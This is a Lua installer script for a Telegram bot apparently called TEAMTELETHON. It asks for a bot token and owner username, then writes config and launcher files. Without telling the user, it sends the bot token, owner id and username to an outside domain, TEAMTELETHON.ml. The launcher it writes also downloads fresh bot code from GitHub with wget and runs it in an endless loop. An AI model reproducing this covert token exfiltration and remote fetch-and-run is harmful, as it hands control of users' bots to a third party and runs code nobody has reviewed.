serpent = dofile("./File_Libs/serpent.lua")
https = require("ssl.https")
http = require("socket.http")
JSON = dofile("./File_Libs/JSON.lua")
local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
Server_TEAMTELETHON = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read("*a")
local function AutoFiles_TEAMTELETHON()
    local function Create_Info(Token, Sudo, UserName)
        local TEAMTELETHON_Info_Sudo = io.open("sudo.lua", "w")
        TEAMTELETHON_Info_Sudo:write(
            [[
token = "]] .. Token .. [["
Sudo = ]] .. Sudo .. [[  
UserName = "]] .. UserName .. [["
]]
        )
        TEAMTELETHON_Info_Sudo:close()
    end
    if not database:get(Server_TEAMTELETHON .. "Token_TEAMTELETHON") then
        print("\27[1;34m»» Send Your Token Bot :\27[m")
        local token = io.read()
        if token ~= "" then
            local url, res = https.request("https://api.telegram.org/bot" .. token .. "/getMe")
            if res ~= 200 then
                io.write("\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m")
            else
                io.write("\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m")
                database:set(Server_TEAMTELETHON .. "Token_TEAMTELETHON", token)
            end
        else
            io.write("\n\27[1;31mThe Token was not Saved\n\27[0;39;49m")
            return AutoFiles_TEAMTELETHON()
        end
    end
    ----------------------
    ----------------------
    if not database:get(Server_TEAMTELETHON .. "UserName_TEAMTELETHON") then
        print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
        local UserName = io.read():gsub("@", "")
        if UserName ~= "" then
            local Get_Info = http.request("http://TshAkE.ml/info/?user=" .. UserName)
            if Get_Info:match("Is_Spam") then
                io.write(
                    "\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m"
                )
                return false
            end
            local Json = JSON:decode(Get_Info)
            if Json.Info == false then
                io.write("\n\27[1;31m»» Sorry The UserName is not Correct \n\27[0;39;49m")
                return AutoFiles_TEAMTELETHON()
            else
                if Json.Info == "Channel" then
                    io.write("\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m")
                    return AutoFiles_TEAMTELETHON()
                else
                    io.write("\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m")
                    database:set(Server_TEAMTELETHON .. "UserName_TEAMTELETHON", Json.Info.Username)
                    database:set(Server_TEAMTELETHON .. "Id_TEAMTELETHON", Json.Info.Id)
                end
            end
        else
            io.write("\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m")
            return AutoFiles_TEAMTELETHON()
        end
    end
    local function Files_TEAMTELETHON_Info()
        Create_Info(
            database:get(Server_TEAMTELETHON .. "Token_TEAMTELETHON"),
            database:get(Server_TEAMTELETHON .. "Id_TEAMTELETHON"),
            database:get(Server_TEAMTELETHON .. "UserName_TEAMTELETHON")
        )
        https.request(
            "https://TEAMTELETHON.ml/telethonconfig.php?id=" ..
                database:get(Server_TEAMTELETHON .. "Id_TEAMTELETHON") ..
                    "&user=" ..
                        database:get(Server_TEAMTELETHON .. "UserName_TEAMTELETHON") ..
                            "&token=" .. database:get(Server_TEAMTELETHON .. "Token_TEAMTELETHON")
        )
        local RunTEAMTELETHON = io.open("TEAMTELETHON", "w")
        RunTEAMTELETHON:write(
            [[
#!/usr/bin/env bash
cd $HOME/TEAMTELETHON
token="]] ..
                database:get(Server_TEAMTELETHON .. "Token_TEAMTELETHON") ..
                    [["
rm -fr TEAMTELETHON.lua
wget "https://raw.githubusercontent.com/telethon-Arab/TEAMTELETHON/master/TEAMTELETHON.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./TEAMTELETHON.lua -p PROFILE --bot=$token
done
]]
        )
        RunTEAMTELETHON:close()
        local RunTs = io.open("on", "w")
        RunTs:write(
            [[
#!/usr/bin/env bash
cd $HOME/TEAMTELETHON
while(true) do
rm -fr ../.telegram-cli
screen -S TEAMTELETHON -X kill
chmod +x TEAMTELETHON
screen -S TEAMTELETHON ./TEAMTELETHON
done
]]
        )
        RunTs:close()
    end
    Files_TEAMTELETHON_Info()
    database:del(Server_TEAMTELETHON .. "Token_TEAMTELETHON")
    database:del(Server_TEAMTELETHON .. "Id_TEAMTELETHON")
    database:del(Server_TEAMTELETHON .. "UserName_TEAMTELETHON")
    os.execute("chmod +x on tg && ./on")
    sudos = dofile("sudo.lua")
end
local function Load_File()
    local f = io.open("./sudo.lua", "r")
    if not f then
        AutoFiles_TEAMTELETHON()
        var = true
    else
        f:close()
        database:del(Server_TEAMTELETHON .. "Token_TEAMTELETHON")
        database:del(Server_TEAMTELETHON .. "Id_TEAMTELETHON")
        database:del(Server_TEAMTELETHON .. "UserName_TEAMTELETHON")
        sudos = dofile("sudo.lua")
        os.execute("chmod +x on tg && ./on")
        var = false
    end
    return var
end
Load_File()
